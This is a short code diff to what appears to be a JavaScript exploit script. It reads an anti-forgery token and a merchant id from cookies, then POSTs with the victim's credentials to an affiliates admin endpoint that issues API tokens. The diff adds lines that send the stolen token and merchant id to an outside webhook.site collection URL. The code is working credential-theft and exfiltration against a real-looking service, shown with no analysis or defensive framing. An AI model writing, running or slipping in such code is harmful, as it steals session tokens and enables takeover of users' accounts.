@@ -17,6 +17,10 @@ function getCookie(name) {
 dataToSend.authenticity_token = getCookie("XSRF-TOKEN-X");
 dataToSend.merchant = getCookie("merchant_id");
 
+var xmlHttp11 = new XMLHttpRequest();
+    xmlHttp11.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?a="+JSON.stringify(dataToSend) , false ); // false for synchronous request
+    xmlHttp11.send( null );
+
 fetch('https://affiliates-api.ggpartners.com/api2/admin/profile/api_tokens', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
